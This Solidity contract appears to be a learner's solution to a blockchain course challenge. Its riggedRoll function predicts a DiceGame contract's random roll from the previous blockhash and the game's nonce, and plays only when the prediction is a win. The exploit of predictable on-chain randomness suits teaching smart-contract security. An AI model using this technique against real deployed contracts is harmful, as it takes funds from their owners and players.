pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

    function withdraw(address payable _to, uint256 _amount) public onlyOwner {
        require(_to != address(0), "Invalid recipient");
        require(_amount > 0, "Amount must be > 0");
        require(address(this).balance >= _amount, "Insufficient contract balance");

        (bool success, ) = _to.call{ value: _amount }("");
        require(success, "Transfer failed.");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.

    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Must send Ether to roll");
        uint256 predictedRoll = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), address(diceGame), diceGame.nonce()))) % 16;

        console.log("Predicted Roll:", predictedRoll);

        require(predictedRoll <= 5, "Predicted roll is not a winning roll");
        
        diceGame.rollTheDice{value: address(this).balance}();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
